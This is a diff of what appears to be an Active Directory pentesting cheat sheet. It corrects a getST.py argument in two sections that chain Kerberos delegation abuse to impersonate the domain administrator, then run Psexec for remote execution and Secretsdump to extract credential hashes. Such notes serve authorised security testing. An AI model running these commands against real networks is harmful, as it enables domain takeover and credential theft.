@@ -1272,7 +1272,7 @@ Get-DomainUser | Where-Object {!($_.memberof -match "Protected Users")} | Where-
 #### Impersonate any user and exploit
 - Impersonate any user except those in groups "Protected Users" or accounts with the "This account is sensitive and cannot be delegated" right
 ```
-getST.py <DOMAIN>/FAKE01@<TARGET FQDN> -spn cifs/<TARGET FQDN> -impersonate administrator -dc-ip <DC IP>
+getST.py <DOMAIN>/FAKE01 -spn cifs/<TARGET FQDN> -impersonate administrator -dc-ip <DC IP>
 export KRB5CCNAME=administrator.ccache
 python3 Psexec.py -k -no-pass <TARGET FQDN>
 python3 Secretsdump.py -k <TARGET FQDN>
@@ -1333,7 +1333,7 @@ change-lockscreen -webdav \\webdav@8080\
 
 #### Impersonate any user
 ```
-getST.py <DOMAIN>/FAKE01@<TARGET FQDN> -spn cifs/<TARGET FQDN> -impersonate administrator -dc-ip <DC IP>
+getST.py <DOMAIN>/FAKE01 -spn cifs/<TARGET FQDN> -impersonate administrator -dc-ip <DC IP>
 export KRB5CCNAME=administrator.ccache
 Psexec.py -k -no-pass <TARGET FQDN>
 ```
